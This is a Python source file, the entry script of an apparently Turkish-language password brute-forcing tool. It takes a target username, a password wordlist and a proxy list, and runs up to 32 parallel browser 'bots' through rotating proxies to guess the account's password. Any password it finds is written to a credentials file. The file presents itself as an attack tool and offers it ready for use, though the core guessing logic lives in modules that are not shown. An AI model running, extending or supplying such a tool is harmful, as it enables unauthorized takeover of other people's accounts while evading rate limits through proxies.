# Date: 12/04/2021
# Author: Erkoyuncu
# Twitter:VolkanErk
# İnstagram:Volkanerkoyuncu
# Github:Erkoyuncu

# from lib.proxy import Proxy
import os
import time
from sys import exit
from lib import database
from lib.proxy_manager import ProxyManager

# from os.path import exists
from lib.bruter import Bruter
from lib.display import Display
from platform import python_version

from lib.const import credentials, modes
from argparse import ArgumentParser, ArgumentTypeError


class Engine(object):
    def __init__(self, username, threads, passlist_path, is_color):
        self.resume = False
        self.is_alive = True
        self.threads = threads
        self.username = username
        self.passlist_path = passlist_path
        self.display = Display(is_color=is_color)
        self.bruter = Bruter(username, threads, passlist_path)

    def get_user_resp(self):
        return self.display.prompt(
            "Saldırıyı başlatıyorum son kontrollerini yaptın mı? [e/H]: "
        )

    def write_to_file(self, password):
        with open(credentials, "at") as f:
            data = "Username: {}\nPassword: {}\n\n".format(
                self.username.title(), password
            )
            f.write(data)

    def start(self):

        while self.is_alive and not self.bruter.password_manager.session:
            pass

        if not self.is_alive:
            return

        if self.bruter.password_manager.session.exists:
            try:
                resp = self.get_user_resp()
            except:
                self.is_alive = False

            if resp and self.is_alive:
                if resp.strip().lower() == "e":
                    self.bruter.password_manager.resume = True

        try:
            self.bruter.start()
        except KeyboardInterrupt:
            self.bruter.stop()
            self.bruter.display.shutdown(
                self.bruter.last_password,
                self.bruter.password_manager.attempts,
                len(self.bruter.browsers),
            )
        finally:
            self.stop()

    def stop(self):
        if self.is_alive:

            self.bruter.stop()
            self.is_alive = False

            if (
                self.bruter.password_manager.is_read
                and not self.bruter.is_found
                and not self.bruter.password_manager.list_size
            ):
                self.bruter.display.stats_not_found(
                    self.bruter.last_password,
                    self.bruter.password_manager.attempts,
                    len(self.bruter.browsers),
                )

            if self.bruter.is_found:
                self.write_to_file(self.bruter.password)
                self.bruter.display.stats_found(
                    self.bruter.password,
                    self.bruter.password_manager.attempts,
                    len(self.bruter.browsers),
                )


def valid_int(n):
    if not n.isdigit():
        raise ArgumentTypeError("mode must be a number")

    n = int(n)

    if n > 3:
        raise ArgumentTypeError("maximum 3 mod yapabilirsin")

    if n < 0:
        raise ArgumentTypeError("minimum 0 mod yapabilirsin")

    return n


def valid_float(n):

    err_msg = "prune 0 ile 1 arasında bir değer olmalıdır"

    try:
        n = float(n)
    except ValueError:
        raise ArgumentTypeError(err_msg)

    if n < 0 or n > 1:
        raise ArgumentTypeError(err_msg)

    return n


def args():
    args = ArgumentParser()
    args.add_argument("-k", "--kullanıcıadı", help="email veya kullanıcı adı")
    args.add_argument("-p", "--passlistesi", help="password listesi")
    args.add_argument("-px", "--proxylistesi", help="proxy listesi")
    args.add_argument(
        "--prune",
        default=-1,
        type=valid_float,
        help="Veri tabanını budamak için",
    )
    args.add_argument(
        "--stats", action="store_true", help="proxy istatisliklerini görmek için"
    )

    args.add_argument(
        "-nc",
        "--yok-renk",
        dest="color",
        action="store_true",
        help="renk iptal",
    )
    args.add_argument(
        "-m",
        "--mod",
        default=2,
        type=valid_int,
        help="modlar: 0 => 32 bot; 1 => 16 bot; 2 => 8 bot; 3 => 4 bot",
    )

    # ----------- #

    arguments = args.parse_args()
    username = arguments.kullanıcıadı
    passlist = arguments.passlistesi
    proxylist = arguments.proxylistesi
    prune = arguments.prune
    stats = arguments.stats
    prune_db = prune > 0

    if not (prune_db or stats or proxylist) and not (username and passlist):
        args.print_help()
        exit()

    return args.parse_args()


def prune_database(prune: float) -> None:
    score = prune * 100

    if (
        input(
            "Proxy Database prune istermisin?  [e/H]: "
        )
        == "e"
    ):

        print(
            f"\n<<< Tüm proxyleri buda {score}% veya daha az kullan >>>"
        )
        time.sleep(0.65)

        print(
            f"Tüm proxyleri buda {database.Proxy().prune(prune)} proxiler"
        )
        time.sleep(0.65)
    else:
        print("Pruning cancelled")


def display_database_stats():
    data = database.Proxy().stats()

    place = 5

    q1 = round(data["q1"], place)
    avg = round(data["avg"], place)
    min = round(data["min"], place)
    max = round(data["max"], place)
    total = data["total"]
    health = (
        "Dead"
        if avg == 0
        else "Very-ill"
        if avg <= 0.10
        else "Ill"
        if avg <= 0.30
        else "Somewhat-ill"
        if avg <= 0.50
        else "Normal"
        if avg <= 0.70
        else "Healthy"
        if avg <= 0.9
        else "Very-healthy"
    )

    print(f"\nTotal Proxies: {total}\nDatabase's Health: {health}")
    print(
        f"Q1: {q1} :: Avg Score: {avg}  ::  Min Score: {min}  ::  Max Score: {max}"
    )
    time.sleep(0.65)


def main():
    arguments = args()
    mode = arguments.mod
    username = arguments.kullanıcıadı
    passlist = arguments.passlistesi
    proxylist = arguments.proxylistesi
    prune = arguments.prune
    stats = arguments.stats
    prune_db = prune > 0

    if prune_db > 0 or stats:
        if prune_db > 0:
            prune_database(prune)
        if stats:
            display_database_stats()
    else:
        if proxylist:
            if not os.path.exists(proxylist):
                print("Proxy list yüklendi")
                exit()

            print(f"Proxy listesini bi kontrol edelim")
            time.sleep(0.65)

            total_written = ProxyManager().write2db(proxylist)

            print(f"Veri tabanına yazılan proxyler:  {total_written}")
            time.sleep(0.65)

        total_proxies = len(database.Proxy().get_proxies())

        if username and passlist and total_proxies:

            if not os.path.exists(passlist):
                print("Verdiğin şifre yolu geçersiz düzgün yaz.")
                exit()

            Engine(
                username, modes[mode], passlist, not arguments.color
            ).start()

        else:
            if not proxylist or total_proxies == 0:
                print("proxy listesine bi bak bakalım proxy varmı çünkü ben proxy göremedim.")


if __name__ == "__main__":

    if int(python_version()[0]) < 3:
        print("[!]Python 3 Kullan")
        exit()

    main()
